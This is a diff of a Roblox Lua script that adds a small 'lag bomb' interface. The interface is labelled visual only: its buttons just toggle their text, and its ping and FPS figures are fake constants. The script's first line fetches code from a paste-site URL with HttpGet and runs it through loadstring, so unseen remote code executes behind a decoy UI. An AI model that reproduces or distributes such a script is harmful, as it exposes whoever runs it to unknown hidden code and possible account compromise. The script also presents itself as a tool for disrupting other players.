@@ -1,1 +1,86 @@
 loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/mIuRqkIqK9AaUqzY/raw"))()
+--// Small Visual Lag Bomb UI (Visual Only)
+
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.Name = "LagBombUI"
+
+-- Main Frame (SMALL)
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0, 160, 0, 130)
+frame.Position = UDim2.new(0.5, -80, 0.5, -65)
+frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+
+-- Title
+local title = Instance.new("TextLabel", frame)
+title.Size = UDim2.new(1, 0, 0, 20)
+title.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+title.Text = "zzz's lag bomb"
+title.TextColor3 = Color3.new(1,1,1)
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 12
+
+-- Ping
+local ping = Instance.new("TextLabel", frame)
+ping.Position = UDim2.new(0, 6, 0, 25)
+ping.Size = UDim2.new(1, -12, 0, 15)
+ping.BackgroundTransparency = 1
+ping.Text = "Ping: 52 ms"
+ping.TextColor3 = Color3.fromRGB(200,200,200)
+ping.TextSize = 11
+ping.TextXAlignment = Enum.TextXAlignment.Left
+
+-- FPS
+local fps = Instance.new("TextLabel", frame)
+fps.Position = UDim2.new(0, 6, 0, 40)
+fps.Size = UDim2.new(1, -12, 0, 15)
+fps.BackgroundTransparency = 1
+fps.Text = "FPS: 69"
+fps.TextColor3 = Color3.fromRGB(200,200,200)
+fps.TextSize = 11
+fps.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Button Creator
+local function createButton(text, color, yPos)
+	local btn = Instance.new("TextButton", frame)
+	btn.Size = UDim2.new(1, -12, 0, 22)
+	btn.Position = UDim2.new(0, 6, 0, yPos)
+	btn.BackgroundColor3 = color
+	btn.Text = text
+	btn.TextColor3 = Color3.new(1,1,1)
+	btn.Font = Enum.Font.SourceSansBold
+	btn.TextSize = 11
+	btn.BorderSizePixel = 0
+	return btn
+end
+
+-- Buttons (SMALL)
+local lagBtn = createButton("lag em", Color3.fromRGB(70,130,180), 60)
+local resetBtn = createButton("Reset", Color3.fromRGB(200,50,50), 85)
+local speedBtn = createButton("Speed [E]", Color3.fromRGB(150,80,80), 110)
+
+-- Toggle (visual only)
+local enabled = false
+
+lagBtn.MouseButton1Click:Connect(function()
+	enabled = not enabled
+	lagBtn.Text = enabled and "lag ON" or "lag OFF"
+end)
+
+resetBtn.MouseButton1Click:Connect(function()
+	enabled = false
+	lagBtn.Text = "lag em"
+end)
+
+-- Keybind
+game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
+	if gp then return end
+	if input.KeyCode == Enum.KeyCode.E then
+		speedBtn.Text = "Speed ON"
+		task.wait(0.4)
+		speedBtn.Text = "Speed [E]"
+	end
+end)
